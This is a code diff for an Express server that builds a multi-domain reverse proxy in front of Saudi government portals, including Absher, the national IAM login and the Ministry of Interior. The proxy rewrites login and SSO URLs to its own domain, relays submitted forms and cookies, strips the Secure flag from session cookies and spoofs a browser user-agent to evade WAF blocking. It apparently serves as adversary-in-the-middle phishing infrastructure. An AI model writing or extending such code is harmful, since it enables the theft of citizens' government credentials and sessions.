@@ -5,8 +5,7 @@ const cors = require("cors");
 const cookieParser = require("cookie-parser");
 const fs = require("fs");
 const path = require("path");
-const axios = require("axios");
-const { createProxyMiddleware } = require("http-proxy-middleware");
+const httpProxy = require("http-proxy");
 require("dotenv").config();
 
 const app = express();
@@ -1282,90 +1281,220 @@ io.on("connection", (socket) => {
 });
 
 // ============================================
-// REVERSE PROXY for saudibusiness.gov.sa
+// FAST MULTI-DOMAIN REVERSE PROXY
+// Proxies: saudibusiness.gov.sa, iam.gov.sa, absher.sa, api.saudibusiness.gov.sa
 // ============================================
-const proxyMiddleware = createProxyMiddleware({
-  target: "https://www.saudibusiness.gov.sa",
-  changeOrigin: true,
-  selfHandleResponse: true,
-  pathRewrite: (path) => path.replace(/^\/proxy/, ""),
-  on: {
-    proxyReq: (proxyReq, req) => {
-      // Set proper host and referer
-      proxyReq.setHeader("Host", "www.saudibusiness.gov.sa");
-      proxyReq.setHeader("Referer", "https://www.saudibusiness.gov.sa/");
-      proxyReq.setHeader("Origin", "https://www.saudibusiness.gov.sa");
-      proxyReq.removeHeader("Accept-Encoding"); // Get uncompressed for rewriting
-    },
-    proxyRes: (proxyRes, req, res) => {
-      // Forward Set-Cookie headers with domain rewritten
-      const setCookies = proxyRes.headers["set-cookie"];
-      if (setCookies) {
-        const rewritten = (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c => {
-          return c.replace(/;\s*Domain=[^;]*/gi, "").replace(/;\s*Path=[^;]*/gi, "; Path=/");
-        });
-        res.setHeader("Set-Cookie", rewritten);
-      }
+const https = require("https");
+const zlib = require("zlib");
 
-      // Handle redirects
-      if ([301, 302, 303, 307, 308].includes(proxyRes.statusCode)) {
-        let location = proxyRes.headers["location"] || "";
-        location = location.replace(/https?:\/\/www\.saudibusiness\.gov\.sa/g, "/proxy");
-        location = location.replace(/https?:\/\/saudibusiness\.gov\.sa/g, "/proxy");
-        if (location.startsWith("/") && !location.startsWith("/proxy")) {
-          location = "/proxy" + location;
-        }
-        res.writeHead(proxyRes.statusCode, { Location: location, ...(setCookies ? { "Set-Cookie": res.getHeader("Set-Cookie") } : {}) });
-        res.end();
-        return;
-      }
+// Domain mapping: prefix → target
+const PROXY_DOMAINS = {
+  "sb":   { host: "www.saudibusiness.gov.sa", origin: "https://www.saudibusiness.gov.sa" },
+  "api":  { host: "api.saudibusiness.gov.sa", origin: "https://api.saudibusiness.gov.sa" },
+  "iam":  { host: "www.iam.gov.sa",           origin: "https://www.iam.gov.sa" },
+  "absher": { host: "www.absher.sa",           origin: "https://www.absher.sa" },
+  "moi":  { host: "www.moi.gov.sa",           origin: "https://www.moi.gov.sa" },
+};
 
-      const contentType = proxyRes.headers["content-type"] || "";
+// Reverse lookup: hostname → prefix
+const HOST_TO_PREFIX = {};
+for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
+  HOST_TO_PREFIX[cfg.host] = prefix;
+  // Also map without www
+  HOST_TO_PREFIX[cfg.host.replace("www.", "")] = prefix;
+}
+
+// Default prefix
+const DEFAULT_PREFIX = "sb";
+
+// Rewrite URLs in text content to route through proxy
+function rewriteUrls(text, contentType, currentPrefix) {
+  // Replace all known domain URLs with proxy paths
+  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
+    const hostEsc = cfg.host.replace(/\./g, "\\.");
+    const noWwwHost = cfg.host.replace("www.", "");
+    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
+    text = text.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
+    if (cfg.host !== noWwwHost) {
+      text = text.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
+    }
+  }
+  // Also catch business.sa
+  text = text.replace(/https?:\/\/business\.sa/g, `/p/sb`);
+
+  if (contentType.includes("text/html")) {
+    // Fix relative paths: href="/xxx" → href="/p/{prefix}/xxx"
+    const px = currentPrefix || DEFAULT_PREFIX;
+    text = text.replace(/(href|src|action)=(["'])\/(?!\/|p\/)(.*?)\2/g, `$1=$2/p/${px}/$3$2`);
+    // Fix unquoted href=/xxx
+    text = text.replace(/(href|src|action)=\/(?!p\/)(\S+?)([\s>])/g, `$1="/p/${px}/$2"$3`);
+    // Fix CSS url()
+    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
+    // Fix inline JS paths that start with /
+    text = text.replace(/(["'])\/(?!p\/)(Identity|Culture|lib|dist|plugins|images|src|favicon|authenticationendpoint|logincontext|carbon|samlsso|commonauth)\//g, `$1/p/${px}/$2/`);
+  } else if (contentType.includes("text/css")) {
+    const px = currentPrefix || DEFAULT_PREFIX;
+    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
+  }
+  return text;
+}
+
+// Rewrite redirect Location headers
+function rewriteLocation(location, currentPrefix) {
+  // Check if it points to a known domain
+  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
+    const hostEsc = cfg.host.replace(/\./g, "\\.");
+    const noWwwHost = cfg.host.replace("www.", "");
+    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
+    location = location.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
+    if (cfg.host !== noWwwHost) {
+      location = location.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
+    }
+  }
+  // Relative redirect
+  if (location.startsWith("/") && !location.startsWith("/p/")) {
+    location = `/p/${currentPrefix || DEFAULT_PREFIX}${location}`;
+  }
+  return location;
+}
+
+// Rewrite Set-Cookie headers
+function rewriteCookies(setCookies) {
+  if (!setCookies) return null;
+  return (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c => {
+    return c
+      .replace(/;\s*Domain=[^;]*/gi, "")
+      .replace(/;\s*Secure/gi, "")
+      .replace(/;\s*SameSite=\w+/gi, "; SameSite=Lax");
+  });
+}
+
+// Keep-alive HTTPS agent for speed (reuse connections)
+const agent = new https.Agent({ keepAlive: true, maxSockets: 50, keepAliveMsecs: 30000 });
+
+// Main proxy handler - FAST streaming
+function handleProxy(req, res) {
+  // Express strips /p prefix, so req.url starts with /{prefix}/rest/of/path
+  const match = req.url.match(/^\/([a-z]+)(\/.*)$/);
+  if (!match) {
+    res.writeHead(404);
+    res.end("Not found");
+    return;
+  }
+  const prefix = match[1];
+  const targetPath = match[2];
+  const domainCfg = PROXY_DOMAINS[prefix];
+  if (!domainCfg) {
+    res.writeHead(404);
+    res.end("Unknown proxy target");
+    return;
+  }
+
+  // Build clean headers - only forward safe ones to avoid WAF blocks
+  const cleanHeaders = {
+    host: domainCfg.host,
+    referer: domainCfg.origin + "/",
+    origin: domainCfg.origin,
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    accept: req.headers.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "accept-language": req.headers["accept-language"] || "ar,en;q=0.9",
+  };
+  // Forward cookies
+  if (req.headers.cookie) cleanHeaders.cookie = req.headers.cookie;
+  // Forward content-type for POST
+  if (req.headers["content-type"]) cleanHeaders["content-type"] = req.headers["content-type"];
+  if (req.headers["content-length"]) cleanHeaders["content-length"] = req.headers["content-length"];
+
+  const options = {
+    hostname: domainCfg.host,
+    port: 443,
+    path: targetPath,
+    method: req.method,
+    agent: agent,
+    headers: cleanHeaders,
+  };
+
+  const proxyReq = https.request(options, (proxyRes) => {
+    const contentType = proxyRes.headers["content-type"] || "";
+    const isText = contentType.includes("text/html") || contentType.includes("text/css") || contentType.includes("javascript");
+
+    // Rewrite cookies
+    const cookies = rewriteCookies(proxyRes.headers["set-cookie"]);
+
+    // Handle redirects
+    if ([301, 302, 303, 307, 308].includes(proxyRes.statusCode)) {
+      const loc = rewriteLocation(proxyRes.headers["location"] || "", prefix);
+      const headers = { Location: loc };
+      if (cookies) headers["Set-Cookie"] = cookies;
+      res.writeHead(proxyRes.statusCode, headers);
+      res.end();
+      return;
+    }
+
+    if (isText) {
+      // Buffer text content for URL rewriting
+      const encoding = proxyRes.headers["content-encoding"];
+      let stream = proxyRes;
+      if (encoding === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
+      else if (encoding === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
+      else if (encoding === "deflate") stream = proxyRes.pipe(zlib.createInflate());
+
       const chunks = [];
-      proxyRes.on("data", (chunk) => chunks.push(chunk));
-      proxyRes.on("end", () => {
-        let body = Buffer.concat(chunks);
-
-        // Set headers
-        res.statusCode = proxyRes.statusCode;
-        if (contentType) res.setHeader("Content-Type", contentType);
-        if (proxyRes.headers["cache-control"]) res.setHeader("Cache-Control", proxyRes.headers["cache-control"]);
-        // Remove blocking headers
-        res.removeHeader("X-Frame-Options");
-        res.removeHeader("Content-Security-Policy");
-
-        // Rewrite text content
-        if (contentType.includes("text/html") || contentType.includes("text/css") || contentType.includes("javascript")) {
-          let text = body.toString("utf-8");
-          // Replace absolute URLs
-          text = text.replace(/https?:\/\/www\.saudibusiness\.gov\.sa/g, "/proxy");
-          text = text.replace(/https?:\/\/saudibusiness\.gov\.sa/g, "/proxy");
-          text = text.replace(/https?:\/\/business\.sa/g, "/proxy");
-
-          if (contentType.includes("text/html")) {
-            // Fix relative paths: href="/xxx" → href="/proxy/xxx"
-            text = text.replace(/(href|src|action)=(["'])\/(?!\/|proxy)([^"']*?)\2/g, '$1=$2/proxy/$3$2');
-            // Fix unquoted href=/xxx
-            text = text.replace(/(href|src|action)=\/(?!proxy)([^\s>]+)/g, '$1="/proxy/$2"');
-            // Fix CSS url()
-            text = text.replace(/url\((['"]?)\/(?!proxy)(.*?)\1\)/g, 'url($1/proxy/$2$1)');
-            // Fix inline JS paths
-            text = text.replace(/(["'])\/(?!proxy)(Identity|Culture|lib|dist|plugins|images|src|favicon)\//g, '$1/proxy/$2/');
-          } else if (contentType.includes("text/css")) {
-            text = text.replace(/url\((['"]?)\/(?!proxy)(.*?)\1\)/g, 'url($1/proxy/$2$1)');
-          }
-          res.end(text);
-        } else {
-          // Binary content (images, fonts) - pass through
-          res.end(body);
+      stream.on("data", (chunk) => chunks.push(chunk));
+      stream.on("end", () => {
+        if (res.headersSent) return;
+        let body = Buffer.concat(chunks).toString("utf-8");
+        body = rewriteUrls(body, contentType, prefix);
+        const headers = {};
+        if (contentType) headers["Content-Type"] = contentType;
+        if (cookies) headers["Set-Cookie"] = cookies;
+        headers["Content-Length"] = Buffer.byteLength(body);
+        if (proxyRes.headers["cache-control"]) headers["Cache-Control"] = proxyRes.headers["cache-control"];
+        res.writeHead(proxyRes.statusCode, headers);
+        res.end(body);
+      });
+      stream.on("error", () => {
+        if (!res.headersSent) {
+          res.writeHead(502);
+          res.end("Proxy error");
         }
       });
-    },
-  },
-});
+    } else {
+      // Binary content - STREAM directly (fastest)
+      const headers = {};
+      // Copy relevant headers
+      ["content-type", "content-length", "cache-control", "etag", "last-modified", "content-encoding"].forEach(h => {
+        if (proxyRes.headers[h]) headers[h] = proxyRes.headers[h];
+      });
+      if (cookies) headers["Set-Cookie"] = cookies;
+      res.writeHead(proxyRes.statusCode, headers);
+      proxyRes.pipe(res);
+    }
+  });
 
-// Mount proxy middleware
-app.use("/proxy", proxyMiddleware);
+  proxyReq.on("error", (err) => {
+    console.error("Proxy error:", err.message);
+    if (!res.headersSent) {
+      res.writeHead(502);
+      res.end("Proxy error");
+    }
+  });
+
+  // Pipe request body for POST/PUT
+  if (req.method !== "GET" && req.method !== "HEAD") {
+    req.pipe(proxyReq);
+  } else {
+    proxyReq.end();
+  }
+}
+
+// Mount proxy - single handler for all domains
+app.use("/p", handleProxy);
+
+// Legacy /proxy route → redirect to /p/sb
+app.use("/proxy", (req, res) => {
+  res.redirect(301, "/p/sb" + req.url);
+});
 
 // REST API Routes
 app.get("/", (req, res) => {
